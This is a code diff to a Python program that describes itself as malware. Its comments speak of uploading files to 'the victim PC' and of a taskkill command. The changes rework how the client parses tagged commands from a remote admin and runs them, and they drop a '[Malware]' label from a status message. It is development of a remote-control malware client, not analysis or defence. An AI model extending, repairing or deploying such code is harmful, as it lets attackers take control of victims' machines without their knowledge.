@@ -21,6 +21,7 @@ try:
     import atexit
     import sys
     import threading
+    import datetime
 except ImportError as _exception:
     # If there is import error.
 
@@ -188,11 +189,13 @@ def command_taskkill(_arguments, _event) -> str:
         # Returning error.
         return "Unable to kill this task!"
         
+
 def command_upload(_arguments, _event) -> str:
     # @function command_upload()
     # @returns str
     # @description Function for command "upload" that uploads file on the victim PC.
 
+    # Returning message.
     return "_event.message!"
 
 
@@ -1267,7 +1270,7 @@ def exit_handler() -> None:
     debug_message("Exiting malware!")
 
     # Sever message.
-    server_message(f"[Malware] Disconnected from the network!")
+    server_message(f"Disconnected from the network!")
 
 
 def server_connect() -> None:
@@ -1300,11 +1303,14 @@ def debug_message(_message: str) -> None:
     # @returns None
     # @description Function that shows debug message if debug message is enabled.
 
-    if DEBUG:
-        # If debug is enabled.
+    if not DEBUG:
+        # If debug is not enabled.
 
-        # Printing message.
-        print(_message)
+        # Returning.
+        return
+    
+    # Printing message.
+    print(_message)
 
 
 def get_operating_system() -> str:
@@ -1324,7 +1330,7 @@ def get_operating_system() -> str:
         # Returning linux.
         return "Linux"
 
-    # Unsupported operating system (Should not happen)
+    # Unsupported operating system
     return "!UNSUPPORTED_OS!"
 
 
@@ -1861,12 +1867,21 @@ def client_answer_server(_event) -> None:
         # Getting arguments from the message (Message split by space).
         _message_arguments = _text.split(";")
 
-        if _message_arguments[0] == "alive":
+        if len(_message_arguments) == 0:
+            # If empty.
+
+            # Returning.
+            return 
+
+        # Getting tags.
+        _message_tags = _message_arguments[0]
+        _message_arguments.pop(0)
+
+        if _message_tags == "alive":
             # If this is network command (That is work without tags and for all).
 
             if user_is_admin(_peer):
                 # If user is admin and allowed to make commands.
-                import datetime
 
                 # Getting current time.
                 _current_time = datetime.datetime.now().strftime("%H:%M:%S")
@@ -1881,13 +1896,13 @@ def client_answer_server(_event) -> None:
         else:
             # If this is not alive command.
 
-            if list_intersects(parse_tags(_message_arguments[0]), __TAGS):
+            if list_intersects(parse_tags(_message_tags), __TAGS):
                 # If we have one or more tag from our tags.
 
                 if user_is_admin(_peer):
                     # If user is admin.
 
-                    if len(_message_arguments) < 2:
+                    if len(_message_arguments) == 0:
                         # If there is no tags + command.
 
                         # Responding with error.
@@ -1896,10 +1911,11 @@ def client_answer_server(_event) -> None:
                         # If there is no error.
 
                         # Getting command itself.
-                        _message_command = _message_arguments[1]
+                        _message_command = str(_message_arguments[0]).lower().replace(" ", "")
+                        _message_arguments.pop(0)
 
                         # Getting arguments (Joining all left list indices together).
-                        _command_arguments = ";".join(_message_arguments[2:])
+                        _command_arguments = ";".join(_message_arguments)
 
                         # Executing command.
                         _execution_response = client_execute_command(_message_command, _command_arguments, _event)
@@ -1960,6 +1976,11 @@ def client_answer_server(_event) -> None:
 
                     # Answering with an error.
                     _response_text = MESSAGE_NOT_ADMIN
+            else:
+                # If lists of tags not intersects.
+
+                # Returning.
+                return
     except Exception as _exception: # noqa
         # If there an exception.
 
